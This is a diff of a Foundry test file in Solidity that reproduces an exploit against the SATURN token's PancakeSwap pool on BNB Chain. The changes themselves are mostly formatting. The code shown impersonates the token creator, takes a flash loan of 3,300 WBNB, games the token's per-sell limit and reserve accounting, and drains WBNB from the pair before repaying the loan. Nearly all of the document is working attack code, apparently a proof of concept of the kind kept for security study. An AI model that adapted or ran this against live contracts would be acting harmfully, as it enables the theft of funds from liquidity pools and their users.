@@ -18,6 +18,7 @@ import "../interface.sol";
 // Hacking God : https://www.google.com/
 
 contract ContractTest is Test {
+
     address public attacker = address(this);
     address public SATURN_creater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;
 
@@ -28,9 +29,8 @@ contract ContractTest is Test {
     IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
 
-    
     function setUp() public {
-        vm.createSelectFork("bsc", 38488209-1);
+        vm.createSelectFork("bsc", 38_488_209 - 1);
         vm.label(address(SATURN), "SATURN");
         vm.label(address(WBNB), "WBNB");
         vm.label(address(router), "PancakeSwap Router");
@@ -42,13 +42,13 @@ contract ContractTest is Test {
         SATURN.approve(address(router), type(uint256).max);
         WBNB.approve(address(router), type(uint256).max);
     }
-    
+
     function testExploit() public {
         approveAll();
         // init saturn token
         vm.prank(SATURN_creater);
         address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", false));
-        
+
         uint256 attacker_amount = SATURN.balanceOf(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
         vm.prank(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
         SATURN.transfer(attacker, attacker_amount);
@@ -57,59 +57,35 @@ contract ContractTest is Test {
         address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", true));
 
         // start attack
-        pancakeV3Pool.flash(
-            attacker,
-            0,
-            3300000000000000000000,
-            bytes("")
-        );
-
+        pancakeV3Pool.flash(attacker, 0, 3_300_000_000_000_000_000_000, bytes(""));
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
         (uint256 limit) = abi.decode(result, (uint256));
         uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
 
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
-        path[1] = address(SATURN); 
+        path[1] = address(SATURN);
 
         uint256[] memory amounts = router.getAmountsIn(amount - limit, path);
-        router.swapExactTokensForTokens(
-            amounts[0],
-            0,
-            path,
-            SATURN_creater,
-            type(uint256).max
-        );
+        router.swapExactTokensForTokens(amounts[0], 0, path, SATURN_creater, type(uint256).max);
 
         amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
-
-
 
         vm.roll(block.number + 1);
-        SATURN.transfer(address(pair_WBNB_SATURN), 228832951945080091523153);
-        (uint256 SATURN_reserve, uint256 WBNB_reserve, ) = pair_WBNB_SATURN.getReserves();
+        SATURN.transfer(address(pair_WBNB_SATURN), 228_832_951_945_080_091_523_153);
+        (uint256 SATURN_reserve, uint256 WBNB_reserve,) = pair_WBNB_SATURN.getReserves();
         amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
         path[0] = address(SATURN);
-        path[1] = address(WBNB); 
+        path[1] = address(WBNB);
         amounts = router.getAmountsOut(amount - SATURN_reserve, path);
-        
-        pair_WBNB_SATURN.swap(
-            0,
-            amounts[1],
-            attacker,
-            bytes("")
-        );
-        WBNB.transfer(address(pancakeV3Pool), 3300000000000000000000+fee1);
+
+        pair_WBNB_SATURN.swap(0, amounts[1], attacker, bytes(""));
+        WBNB.transfer(address(pancakeV3Pool), 3_300_000_000_000_000_000_000 + fee1);
     }
 
     fallback() external payable {}
+
 }
-
-
